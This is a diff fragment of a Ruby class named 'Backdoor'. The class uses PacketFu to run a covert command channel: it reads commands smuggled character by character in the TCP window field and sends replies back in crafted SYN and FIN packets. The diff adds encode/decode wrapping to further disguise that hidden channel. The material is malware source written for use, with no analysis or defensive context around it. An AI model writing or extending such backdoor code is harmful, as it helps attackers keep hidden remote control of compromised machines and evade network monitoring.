@@ -50,9 +50,9 @@ class Backdoor
                 @command = ""
             else
                 if @command.nil? then
-                    @command = packet.tcp_win.chr
+                    @command = decode(packet.tcp_win.chr)
                 elsif
-                    @command << packet.tcp_win.chr
+                    @command << decode(packet.tcp_win.chr)
                 end
             end # if
         end # if
@@ -66,11 +66,10 @@ class Backdoor
             tcp = PacketFu::TCPPacket.new()
             
             tcp.eth_saddr = @cfg[:eth_saddr]
-            #tcp.eth_daddr = @cfg[:eth_daddr]
             tcp.tcp_src = rand(0xfff - 1024) + 1024
             tcp.tcp_dst = @conf_array[3].to_i
             tcp.tcp_flags.syn = 1
-            tcp.tcp_win = word
+            tcp.tcp_win = encode(word)
             tcp.tcp_seq = rand(0xffff)
             tcp.ip_saddr = packet.ip_daddr
             tcp.ip_daddr = packet.ip_saddr
@@ -82,7 +81,6 @@ class Backdoor
         tcp_fin = PacketFu::TCPPacket.new()
         
         tcp_fin.eth_saddr = @cfg[:eth_saddr]
-        #tcp_fin.eth_daddr = @cfg[:eth_daddr]
         tcp_fin.tcp_src = rand(0xfff - 1024) + 1024
         tcp_fin.tcp_dst = @conf_array[3].to_i
         tcp_fin.tcp_flags.fin = 1
